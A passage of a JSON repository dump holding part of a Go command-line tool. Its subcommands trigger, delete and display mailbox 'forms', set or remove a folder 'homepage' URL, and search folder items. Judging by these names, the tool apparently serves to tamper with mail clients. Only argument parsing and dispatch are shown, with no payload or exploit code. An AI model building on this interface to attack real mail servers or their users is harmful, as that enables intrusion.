connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = triggerForm(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"delete\",\n\t\t\t\t\tUsage: \"delete an existing form\",\n\t\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"suffix,s\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"The suffix used when creating the form. This must be the same as the value used when the form was created.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\tif c.String(\"suffix\") == \"\" {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew\", 1)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = deleteForm(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"display\",\n\t\t\t\t\tUsage: \"display all existing forms\",\n\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = displayForms(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:  \"homepage\",\n\t\t\tUsage: \"Interact with the homepage function.\",\n\t\t\tSubcommands: []cli.Command{\n\t\t\t\t{\n\t\t\t\t\tName:  \"add\",\n\t\t\t\t\tUsage: \"creates a new homepage. \",\n\t\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"url,u\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"The location where the page is stored\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\tif c.String(\"url\") == \"\" {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"You need to supply a valid URL. Use --url 'http://location/x.html'\", 1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\t//parse URL to ensure valid\n\t\t\t\t\t\tif _, e := url.Parse(c.String(\"url\")); e != nil {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"You need to supply a valid URL. Use --url 'http://location/x.html'\", 1)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcreateHomePage(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"delete\",\n\t\t\t\t\tUsage: \"delete an existing homepage and resets to using folder view\",\n\t\t\t\t\tFlags: []cli.Flag{},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = deleteHomePage()\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"display\",\n\t\t\t\t\tUsage: \"display current homepage setting\",\n\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = displayHomePage()\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:  \"search\",\n\t\t\tUsage: \"Search for items\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"subject\",\n\t\t\t\t\tUsage: \"Search only in the subject\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"term\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"The term to search for\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\tif c.String(\"term\") == \"\" {\n\t\t\t\t\treturn cli.NewExitError(\"You need to supply a valid search term. Use --term\", 1)\n\t\t\t\t}\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\terr = searchFolders(c)\n\t\t\t\texit(err)\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t}\n\n\tapp.Action = func(c *cli.Context) error {\n\t\tcli.ShowAppHelp(c)\n\t\treturn nil\n\t}\n\n\tapp.Run(os.Args)\n}\n"
        },
        {
          "name": "templates",
          "type": "tree",
          "content": null
        },
        {
          "name": "utils",
          "type": "tree",
          "content": null
        },
        {
          "name": "webdav",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}